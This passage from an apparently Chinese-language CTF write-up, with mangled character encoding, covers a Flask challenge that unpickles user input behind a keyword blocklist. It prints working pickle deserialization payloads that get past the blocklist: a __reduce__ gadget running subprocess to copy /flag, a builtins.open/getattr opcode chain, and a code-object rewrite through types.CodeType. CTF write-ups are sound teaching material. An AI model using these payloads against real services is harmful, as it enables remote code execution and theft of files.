punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ppicklee</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span>    sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"not allowed"</span>    sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'sys'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"not allowed"</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        pickle_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">&#123;</span><span class="token string">"os"</span><span class="token punctuation">,</span> <span class="token string">"system"</span><span class="token punctuation">,</span> <span class="token string">"eval"</span><span class="token punctuation">,</span> <span class="token string">'setstate'</span><span class="token punctuation">,</span> <span class="token string">"globals"</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span> <span class="token string">'__builtins__'</span><span class="token punctuation">,</span> <span class="token string">'template'</span><span class="token punctuation">,</span> <span class="token string">'render'</span><span class="token punctuation">,</span> <span class="token string">'\\'</span><span class="token punctuation">,</span>                 <span class="token string">'compile'</span><span class="token punctuation">,</span> <span class="token string">'requests'</span><span class="token punctuation">,</span> <span class="token string">'exit'</span><span class="token punctuation">,</span>  <span class="token string">'pickle'</span><span class="token punctuation">,</span><span class="token string">"class"</span><span class="token punctuation">,</span><span class="token string">"mro"</span><span class="token punctuation">,</span><span class="token string">"flask"</span><span class="token punctuation">,</span><span class="token string">"sys"</span><span class="token punctuation">,</span><span class="token string">"base"</span><span class="token punctuation">,</span><span class="token string">"init"</span><span class="token punctuation">,</span><span class="token string">"config"</span><span class="token punctuation">,</span><span class="token string">"session"</span><span class="token punctuation">&#125;</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> i<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> pickle_data<span class="token punctuation">:</span>                <span class="token keyword">return</span> i<span class="token operator">+</span><span class="token string">" waf !!!!!!!"</span>        pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>pickle_data<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"success pickle"</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"fail pickle"</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> username <span class="token operator">!=</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">'You are not admin!'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"Welcome Admin"</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/src'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">src</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span>  <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"app.py"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flagè·¯å¾„å·²çŸ¥åœ¨&#x2F;flagï¼Œæ ¹æœ¬é€»è¾‘å°±æ˜¯ pickle ç»• waf æ‰“æ–‡ä»¶åŒ…å«</p><p>å€¼å¾—æ³¨æ„çš„æ˜¯å¼€å¤´å¼•å…¥äº† builtins å’Œ io ä¸¤ä¸ªåº“</p><p>è§‚å¯Ÿä¸€ä¸‹waf</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token string">"os"</span><span class="token punctuation">,</span> <span class="token string">"system"</span><span class="token punctuation">,</span> <span class="token string">"eval"</span><span class="token punctuation">,</span> <span class="token string">'setstate'</span><span class="token punctuation">,</span> <span class="token string">"globals"</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span><span class="token string">'__builtins__'</span><span class="token punctuation">,</span> <span class="token string">'template'</span><span class="token punctuation">,</span> <span class="token string">'render'</span><span class="token punctuation">,</span> <span class="token string">'\\'</span><span class="token punctuation">,</span> <span class="token string">'compile'</span><span class="token punctuation">,</span> <span class="token string">'requests'</span><span class="token punctuation">,</span><span class="token string">'exit'</span><span class="token punctuation">,</span> <span class="token string">'pickle'</span><span class="token punctuation">,</span> <span class="token string">"class"</span><span class="token punctuation">,</span> <span class="token string">"mro"</span><span class="token punctuation">,</span> <span class="token string">"flask"</span><span class="token punctuation">,</span> <span class="token string">"sys"</span><span class="token punctuation">,</span> <span class="token string">"base"</span><span class="token punctuation">,</span> <span class="token string">"init"</span><span class="token punctuation">,</span><span class="token string">"config"</span><span class="token punctuation">,</span> <span class="token string">"session"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è§‚å¯Ÿä¸€ä¸‹ï¼Œå¼•å…¥çš„åº“é‡Œä¹Ÿå°± builtins å’Œ io æ²¡è¢«ban</p> <br><h2 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h2><p>æƒ³äº†åŠå¤©æ€ä¹ˆç”¨å®ƒç»™çš„ io æŠŠè¯»å–çš„æ–‡ä»¶å¯¹è±¡å¸¦å‡ºæ¥ï¼Œç»“æœç›´æ¥ç”¨<code>subprocess</code>åº“ cp åˆ° app.py å°±è¡Œäº†</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> pickle<span class="token keyword">import</span> subprocess  <span class="token keyword">class</span> <span class="token class-name">proc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"cp"</span><span class="token punctuation">,</span><span class="token string">"/flag"</span><span class="token punctuation">,</span><span class="token string">"/app/app.py"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   a<span class="token operator">=</span>proc<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p>è¿˜å¯ä»¥åˆ©ç”¨ builtins.open è¯»å‡º &#x2F;flag å†å†™å…¥ app.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">builtins<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span>builtins<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'read'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>builtins<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span>builtins<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./app.py'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'write'</span><span class="token punctuation">)</span><span class="token punctuation">(</span>builtins<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span>builtins<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'read'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å†™pkerè„šæœ¬ç”Ÿæˆopcodeï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">getattr</span> <span class="token operator">=</span> GLOBAL<span class="token punctuation">(</span><span class="token string">'builtins'</span><span class="token punctuation">,</span> <span class="token string">'getattr'</span><span class="token punctuation">)</span><span class="token builtin">open</span> <span class="token operator">=</span> GLOBAL<span class="token punctuation">(</span><span class="token string">'builtins'</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">)</span>flag<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span>read<span class="token operator">=</span><span class="token builtin">getattr</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token string">'read'</span><span class="token punctuation">)</span>f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./app.py'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span>write<span class="token operator">=</span><span class="token builtin">getattr</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token string">'write'</span><span class="token punctuation">)</span>fff<span class="token operator">=</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>write<span class="token punctuation">(</span>fff<span class="token punctuation">)</span><span class="token keyword">return</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="é¢„æœŸ"><a href="#é¢„æœŸ" class="headerlink" title="é¢„æœŸ"></a>é¢„æœŸ</h2><p>é¢„æœŸè›®æœ‰æ„æ€ï¼Œä¹Ÿå¥‘åˆäº†è¿™é¢˜çš„é¢˜ç›®åç§°â€”â€”const</p><h3 id="pythonå­—èŠ‚ç "><a href="#pythonå­—èŠ‚ç " class="headerlink" title="pythonå­—èŠ‚ç "></a>pythonå­—èŠ‚ç </h3><p>é¦–å…ˆäº†è§£ä¸€ä¸‹pythonçš„å­—èŠ‚ç ï¼Œå‚è€ƒï¼š<a href="https://developer.aliyun.com/article/1615860">https://developer.aliyun.com/article/1615860</a></p><p>PyCodeObject çš„åº•å±‚ç»“æ„ï¼šInclude&#x2F;code.h</p><pre class="line-numbers language-h" data-language="h"><code class="language-h">typedef struct &#123;    PyObject_HEAD&#x2F;&#x2F; å¤´éƒ¨ä¿¡æ¯ï¼Œæˆ‘ä»¬çœ‹åˆ°çœŸçš„ä¸€åˆ‡çš†å¯¹è±¡ï¼Œå­—èŠ‚ç ä¹Ÿæ˜¯ä¸ªå¯¹è±¡    int co_argcount;&#x2F;&#x2F; å¯ä»¥é€šè¿‡ä½ç½®å‚æ•°ä¼ é€’çš„å‚æ•°ä¸ªæ•°    int co_posonlyargcount;     &#x2F;&#x2F; åªèƒ½é€šè¿‡ä½ç½®å‚æ•°ä¼ é€’çš„å‚æ•°ä¸ªæ•°ï¼ŒPython3.8æ–°å¢    int co_kwonlyargcount;     &#x2F;&#x2F; åªèƒ½é€šè¿‡å…³é”®å­—å‚æ•°ä¼ é€’çš„å‚æ•°ä¸ªæ•°    int co_nlocals;             &#x2F;&#x2F; ä»£ç å—ä¸­å±€éƒ¨å˜é‡çš„ä¸ªæ•°ï¼Œä¹ŸåŒ…æ‹¬å‚æ•°    int co_stacksize;          &#x2F;&#x2F; æ‰§è¡Œè¯¥æ®µä»£ç å—éœ€è¦çš„æ ˆç©ºé—´    int co_flags;               &#x2F;&#x2F; å‚æ•°ç±»å‹æ ‡è¯†        int co_firstlineno;         &#x2F;&#x2F; ä»£ç å—åœ¨æ–‡ä»¶ä¸­çš„è¡Œå·    PyObject *co_code;         &#x2F;&#x2F; æŒ‡ä»¤é›†ï¼Œä¹Ÿå°±æ˜¯å­—èŠ‚ç ï¼Œå®ƒæ˜¯ä¸€ä¸ªbyteså¯¹è±¡     PyObject *co_consts;       &#x2F;&#x2F; å¸¸é‡æ± ï¼Œä¸€ä¸ªå…ƒç»„ï¼Œä¿å­˜ä»£ç å—ä¸­çš„æ‰€æœ‰å¸¸é‡    PyObject *co_names;      &#x2F;&#x2F; ä¸€ä¸ªå…ƒç»„ï¼Œä¿å­˜ä»£ç å—ä¸­å¼•ç”¨çš„å…¶å®ƒä½œç”¨åŸŸçš„å˜é‡       PyObject *co_varnames;    &#x2F;&#x2F; ä¸€ä¸ªå…ƒç»„ï¼Œä¿å­˜å½“å‰ä½œç”¨åŸŸä¸­çš„å˜é‡    PyObject *co_freevars;      &#x2F;&#x2F; å†…å±‚å‡½æ•°å¼•ç”¨çš„å¤–å±‚å‡½æ•°çš„ä½œç”¨åŸŸä¸­çš„å˜é‡    PyObject *co_cellvars;      &#x2F;&#x2F; å¤–å±‚å‡½æ•°çš„ä½œç”¨åŸŸä¸­è¢«å†…å±‚å‡½æ•°å¼•ç”¨çš„å˜é‡ï¼Œæœ¬è´¨ä¸Šå’Œco_freevarsæ˜¯ä¸€æ ·çš„    Py_ssize_t *co_cell2arg;    PyObject *co_filename;    &#x2F;&#x2F; ä»£ç å—æ‰€åœ¨çš„æ–‡ä»¶å    PyObject *co_name;         &#x2F;&#x2F; ä»£ç å—çš„åå­—ï¼Œé€šå¸¸æ˜¯å‡½æ•°åã€ç±»åï¼Œæˆ–è€…æ–‡ä»¶å    PyObject *co_lnotab;        &#x2F;&#x2F; å­—èŠ‚ç æŒ‡ä»¤ä¸pythonæºä»£ç çš„è¡Œå·ä¹‹é—´çš„å¯¹åº”å…³ç³»ï¼Œä»¥PyByteObjectçš„å½¢å¼å­˜åœ¨&#125; PyCodeObject;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>python ç¼–è¯‘å™¨åœ¨å¯¹æºä»£ç è¿›è¡Œç¼–è¯‘çš„æ—¶å€™ï¼Œå¯¹äºä»£ç ä¸­çš„æ¯ä¸€ä¸ª blockï¼Œéƒ½ä¼šåˆ›å»ºä¸€ä¸ª PyCodeObject ä¸ä¹‹å¯¹åº”</p><p>blockï¼šå½“è¿›å…¥ä¸€ä¸ªæ–°çš„å‘½åç©ºé—´ï¼Œæˆ–è€…è¯´ä½œç”¨åŸŸæ—¶ï¼Œå°±ç®—æ˜¯è¿›å…¥äº†ä¸€ä¸ªæ–°çš„ block</p><p>demoï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token number">123</span><span class="token keyword">def</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ®µä»£ç ç¼–è¯‘å®Œåä¼šäº§ç”Ÿä¸‰ä¸ª PyCodeObject å¯¹è±¡ï¼Œå› ä¸ºè¿™æ˜¯ä¸‰ä¸ªä¸åŒçš„ä½œç”¨åŸŸï¼Œä¸€ä¸ªæ˜¯å¯¹åº”æ•´ä¸ª py æ–‡ä»¶ï¼ˆæ¨¡å—ï¼‰çš„ï¼Œä¸€ä¸ªæ˜¯å¯¹åº” <code>class A</code> çš„ï¼Œä¸€ä¸ªæ˜¯å¯¹åº” <code>def foo</code> çš„</p><br><p>ç„¶åæ˜¯è·å– PyCodeObjectï¼Œé¦–å…ˆè¯¥å¯¹è±¡åœ¨ Python é‡Œé¢çš„ç±»å‹æ˜¯ <code>&lt;class &#39;code&#39;&gt;</code>ï¼Œä½†æ˜¯åº•å±‚æ²¡æœ‰å°†è¿™ä¸ªç±»æš´éœ²ç»™æˆ‘ä»¬ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨<code>__code__</code>çš„æ–¹å¼è·å–</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">src</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"app.py"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>src<span class="token punctuation">.</span>__code__<span class="token punctuation">)</span>  <span class="token comment"># &lt;code object ......</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>src<span class="token punctuation">.</span>__code__<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># &lt;class 'code'></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æ—¢ç„¶æ‹¿åˆ°å¯¹è±¡äº†å°±èƒ½æ‹¿åˆ°åº•å±‚å¯¹åº”çš„ PyCodeObject å¯¹è±¡ï¼Œå¯¹è±¡ç§ç±»å‚è€ƒä¸Šé¢çš„æ•°æ®ç»“æ„</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">src</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"app.py"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>oCode <span class="token operator">=</span> src<span class="token punctuation">.</span>__code__<span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_argcount<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_posonlyargcount<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_kwonlyargcount<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_nlocals<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_stacksize<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_flags<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_code<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_consts<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_names<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_varnames<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_filename<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_name<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_firstlineno<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_lnotab<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_freevars<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_cellvars<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¾“å‡ºä¹‹åå‘ç°ä¸€äº›æœ‰è¶£çš„éƒ¨åˆ†</p><p><img src="/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/image-20250113224313652.png" alt="image-20250113224313652"></p><p>æˆ‘ä»¬å¦‚æœèƒ½å¤Ÿç¯¡æ”¹è¿™é‡Œçš„ co_consts éƒ¨åˆ†ä¸º flag å³å¯å®ç°è¯»å–æ–‡ä»¶</p><h3 id="åˆ›å»ºcodeObject"><a href="#åˆ›å»ºcodeObject" class="headerlink" title="åˆ›å»ºcodeObject"></a>åˆ›å»ºcodeObject</h3><p>å‚è€ƒï¼š<a href="https://stackoverflow.com/questions/16064409/how-to-create-a-code-object-in-python">https://stackoverflow.com/questions/16064409/how-to-create-a-code-object-in-python</a></p><p>ä½¿ç”¨<code>types.CodeType</code>æ–¹æ³•å®ç°</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> types<span class="token keyword">def</span> <span class="token function">src</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"app.py"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>oCode <span class="token operator">=</span> src<span class="token punctuation">.</span>__code__src<span class="token punctuation">.</span>__code__ <span class="token operator">=</span> types<span class="token punctuation">.</span>CodeType<span class="token punctuation">(</span>    oCode<span class="token punctuation">.</span>co_argcount<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_posonlyargcount<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_kwonlyargcount<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_nlocals<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_stacksize<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_flags<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_code<span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">'/flag'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'encoding'</span><span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_names<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_varnames<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_filename<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_name<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_firstlineno<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_lnotab<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_freevars<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_cellvars<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>src<span class="token punctuation">.</span>__code__<span class="token punctuation">.</span>co_consts<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>src<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/image-20250113225724417.png" alt="image-20250113225724417"></p><h3 id="æ„é€ pickle"><a href="#æ„é€ pickle" class="headerlink" title="æ„é€ pickle"></a>æ„é€ pickle</h3><p>æœ€å¤´å¤§çš„ä¸€é›†ï¼Œæ€ä¹ˆæ‰‹æ“å‘¢ï¼ˆ</p><p>åœ¨æ­¤ä¹‹å‰ï¼Œè¦å…ˆæŠŠä¸Šé¢çš„<code>.</code>å…¨éƒ¨æ¢æˆ getattr çš„å½¢å¼</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">g1 <span class="token operator">=</span> builtins<span class="token punctuation">.</span><span class="token builtin">getattr</span>g2 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span><span class="token string">"__code__"</span><span class="token punctuation">)</span>g3 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_argcount"</span><span class="token punctuation">)</span>g4 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_posonlyargcount"</span><span class="token punctuation">)</span>g5 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_kwonlyargcount"</span><span class="token punctuation">)</span>g6 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_nlocals"</span><span class="token punctuation">)</span>g7 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_stacksize"</span><span class="token punctuation">)</span>g8 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_flags"</span><span class="token punctuation">)</span>g9 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_code"</span><span class="token punctuation">)</span>g10 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">'/flag'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'encoding'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># g10 = getattr(g2,"co_consts")</span>g11 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_names"</span><span class="token punctuation">)</span>g12 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_varnames"</span><span class="token punctuation">)</span>g13 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_filename"</span><span class="token punctuation">)</span>g14 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token 